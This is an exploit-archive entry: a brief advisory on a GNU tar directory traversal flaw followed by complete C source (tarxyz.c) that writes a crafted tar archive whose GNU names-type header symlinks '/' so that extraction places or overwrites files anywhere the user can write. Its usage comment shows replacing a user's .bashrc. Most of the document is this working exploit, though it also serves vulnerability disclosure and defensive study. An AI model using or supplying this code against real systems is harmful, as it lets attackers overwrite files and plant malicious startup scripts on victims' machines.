source: http://www.securityfocus.com/bid/21235/info

GNU Tar is prone to a vulnerability that may allow an attacker to place files and overwrite files in arbitrary locations on a vulnerable computer. These issues present themselves when the application processes malicious archives. 

A successful attack can allow the attacker to place potentially malicious files and overwrite files on a computer in the context of the user running the affected application. Successful exploits may aid in further attacks.

 /*
  * tarxyz.c - GNU tar directory traversal exploit.
  * Written by Teemu Salmela.
  *
  * Example usage (creates a tar file that extracts /home/teemu/.bashrc):
  *   $ gcc -o tarxyz tarxyz.c
  *   $ ./tarxyz > ~/xyz.tar
  *   $ mkdir -p /tmp/xyz/home/teemu/
  *   $ cp ~/newbashrc.txt /tmp/xyz/home/teemu/.bashrc
  *   $ cd /tmp
  *   $ tar -rf ~/xyz.tar xyz/home/teemu
  */

 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>

 struct posix_header
{                               /* byte offset */
   char name[100];               /*   0 */
   char mode[8];                 /* 100 */
   char uid[8];                  /* 108 */
   char gid[8];                  /* 116 */
   char size[12];                /* 124 */
   char mtime[12];               /* 136 */
   char chksum[8];               /* 148 */
   char typeflag;                /* 156 */
   char linkname[100];           /* 157 */
   char magic[6];                /* 257 */
   char version[2];              /* 263 */
   char uname[32];               /* 265 */
   char gname[32];               /* 297 */
   char devmajor[8];             /* 329 */
   char devminor[8];             /* 337 */
   char prefix[155];             /* 345 */
                                 /* 500 */
 };

 #define GNUTYPE_NAMES 'N'

 #define BLOCKSIZE       512

 union block
 {
   char buffer[BLOCKSIZE];
   struct posix_header header;
 };

 void
 data(void *p, size_t size)
 {
         size_t n = 0;
         char b[BLOCKSIZE];

         while (size - n > 512) {
                 fwrite(&((char *)p)[n], 1, 512, stdout);
                 n += 512;
         }
         if (size - n) {
                 memset(b, 0, sizeof(b));
                 memcpy(b, &((char *)p)[n], size - n);
                 fwrite(b, 1, sizeof(b), stdout);
         }
 }

 int
 main(int argc, char *argv[])
 {
         char *link_name = "xyz";
         union block b;
         char *d;
         int i;
        unsigned int cksum;

         if (argc > 1)
                 link_name = argv[1];

         if (asprintf(&d, "Symlink / to %s\n", link_name) < 0) {
                 fprintf(stderr, "out of memory\n");
                 exit(1);
         }
         memset(&b, 0, sizeof(b));
         strcpy(b.header.name, "xyz");
         strcpy(b.header.mode, "0000777");
         strcpy(b.header.uid, "0000000");
         strcpy(b.header.gid, "0000000");
         sprintf(b.header.size, "%011o", strlen(d));
         strcpy(b.header.mtime, "00000000000");
         strcpy(b.header.chksum, "        ");
         b.header.typeflag = GNUTYPE_NAMES;
         strcpy(b.header.magic, "ustar  ");
         strcpy(b.header.uname, "root");
         strcpy(b.header.gname, "root");
         for (cksum = 0, i = 0; i < sizeof(b); i++)
                 cksum += b.buffer[i] & 0xff;
         sprintf(b.header.chksum, "%06o ", cksum);
         fwrite(&b, 1, sizeof(b), stdout);
         data(d, strlen(d));
 }

